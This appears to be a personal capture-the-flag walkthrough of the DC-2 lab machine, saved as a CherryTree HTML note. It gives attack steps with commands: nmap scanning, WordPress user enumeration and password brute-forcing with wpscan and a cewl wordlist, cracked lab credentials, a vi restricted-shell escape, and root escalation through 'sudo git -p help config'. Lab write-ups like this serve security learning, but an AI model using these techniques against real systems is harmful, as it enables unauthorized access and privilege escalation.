@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>DC-2</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>DC-2</h1><br/>Netdiscover to find IP<br />nmap -sC -sV -p- 192.168.11.138 -oN DC-2.txt            <br />found 80 (http) and 7744 (ssh) open<br />added dc-2 to /etc/hosts file<br />for 80 ran nikto, dirsearch, davcheck, and wpscan<br />with wp scan I found 3 users (admin, tom, and jerry)<br />used cewl to generate a list of potential passwords by scraping the website.<br />used wpscan brute force tool with the new password list and got 2 accounts<br />tom     = parturient<br />jerry    = adipiscing<br />Logged into the website with these accounts, but could not upload a shell<br />Logged in with ssh via 7744 with tom and his creds<br />was in a very locked ~rshell<br />ran ls $PATH to see what commands I could run (ls, scp, vi, less)<br />went to sbin and saw there was a vi command to escape an rshell (vi, <code>:set shell=/bin/sh</code>   ,    <code>:shell</code>)<br />from there I set a new $PATH (export PATH=/usr/bin:/usr/sbin:/bin:/sbin)<br />I was then able to su jerry<br />sudo -l ( found that I could run git as root)<br />found a git elevate command in GTFOBIN <br />sudo git -p help config<br />!/bin/sh<br />I am now root!! cat /root/final-flag.txt</div></body></html>
